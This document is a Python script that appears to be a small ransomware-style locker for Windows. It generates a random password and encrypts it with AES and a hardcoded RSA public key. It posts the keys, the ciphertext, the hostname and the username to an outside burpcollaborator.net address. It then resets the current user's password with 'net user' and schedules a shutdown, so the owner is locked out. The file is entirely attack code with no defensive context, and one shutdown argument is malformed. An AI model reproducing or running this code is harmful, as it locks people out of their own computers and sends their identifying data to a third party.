#!/usr/bin/env python3
#-*- coding:utf-8 -*-
import base64
import socket
import string
import getpass
import requests
import subprocess
#from os import urandom 
from random import choice,sample
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from binascii import a2b_hex,b2a_hex
from Crypto.Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5



char_set = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ^!$%&/()=?+~#-_.:,;<>|' 

aes_key = ''.join(sample(string.ascii_letters + string.digits,32)).encode('utf-8')

aes_iv = ''.join(sample(string.ascii_letters + string.digits,16)).encode('utf-8')

pubkey = '''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0StjnfdZqZya21dQC71j
UEGqcPjnP26hWLI7mvV1kVz2jPjlewRbvrz3ipvKcr8OY8tuw1PWYUIEjLaetfIM
3GuvbIXnfm8qqQbcWGj8sPAzDetVB27fGyJu9Ukm3SrTyUPI6zXLjIWEjgXqhoCY
ihgnAbag3FSWd2DKwoE2rVs9nxz3lSuJjPqvhjqQv9WN8Po/NYp+uLy+G/zxOHK7
ufzCszCjjz/WiUZ/7yLwJ1SfU9Rg6f67SPGuFfe/upMGlkH9U8RvyXFWD1lV2Pbk
GfWYGpujk3GNeF9YZZYH9RH2zEB3g04FnzaOsFvKeWTqLcjNGxP2KinqJEo4dv9Z
ZwIDAQAB
-----END PUBLIC KEY-----'''

  
def Generate_pass(length=16): 
    password = []
    #print(urandom(1))
    while len(password) < length: 
        key = choice(char_set) 
        password.append(key)
    return ''.join(password)

def Pass_lock(password):
    getuser = getpass.getuser()
    subprocess.Popen(['net','user',getuser,password])
    subprocess.Popen(['shutdown','-s',-t,30])
    return

def Aes_encrypt(msg):
    aescryptor = AES.new(aes_key,AES.MODE_CBC,aes_iv)
    msg = b2a_hex(bytes(msg, encoding="utf-8"))
    length = 16 - (len(msg) % 16)
    msg += bytes([length])*length
    aes_enmsg = base64.b64encode(aescryptor.encrypt(msg))
    return aes_enmsg

def Rsa_encrypt(msg):
    rsacipher = Cipher_pkcs1_v1_5.new(RSA.importKey(pubkey))
    rsacipher_text = base64.b64encode(rsacipher.encrypt(msg))
    return rsacipher_text

def Request_post(datas):
    send = requests.post(url='http://oxpx4jh2y80jixiyz4c5pmyiu90zoo.burpcollaborator.net/11.txt', data=f'AESKEY={aes_key}&AESIV={aes_iv}&RSAENCRYPT={datas}', headers={'INFO':f'NAME={socket.getfqdn(socket.gethostname())}&USER={getpass.getuser()}'}, timeout=15, verify=False)
    print(f'INFO: NAME={socket.getfqdn(socket.gethostname())}&USER={getpass.getuser()}')
    print(f'AESKEY={aes_key}&AESIV={aes_iv}&RSAENCRYPT={datas}')
    return

if __name__ == '__main__': 
    passwd = Generate_pass()
    first = Aes_encrypt(passwd)
    second = Rsa_encrypt(first)
    third = Request_post(second)
    Pass_lock(passwd)
    print('PC has Locked!')
